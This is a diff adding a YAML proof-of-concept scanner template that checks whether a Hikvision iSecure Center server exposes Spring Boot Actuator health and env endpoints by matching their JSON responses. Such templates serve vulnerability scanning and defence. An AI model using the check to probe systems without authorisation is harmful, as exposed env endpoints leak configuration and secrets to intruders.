@@ -1,0 +1,32 @@
+name: poc-yaml-hikvison-isecure-center-springbootactuator
+transport: http
+rules:
+  r0:
+    request:
+      method: GET
+      path: /artemis-portal/artemis/health
+      follow_redirects: false
+    expression: |-
+      response.status == 200 && response.content_type.contains("application/json")
+      && response.body_string.contains('"status":')
+      && response.body_string.contains('"diskSpace":')
+  r1:
+    request:
+      method: GET
+      path: /artemis-portal/artemis/env
+      follow_redirects: false
+    expression: response.status == 200 && response.content_type.contains("application/json") && response.body.bcontains(b'"profiles":') 
+  r2:
+    request:
+      method: GET
+      path: /artemis/env
+      follow_redirects: false
+    expression: |-
+      response.status == 200 && response.body.bcontains(b'"profiles":') 
+      && response.headers["Content-Type"].contains("application/vnd.spring-boot.actuator.v1+json;charset=UTF-8")
+
+expression: r0() || r1() || r2()
+detail:
+  author: laura
+  links:
+    - https://github.com/Laura0xiaoshizi
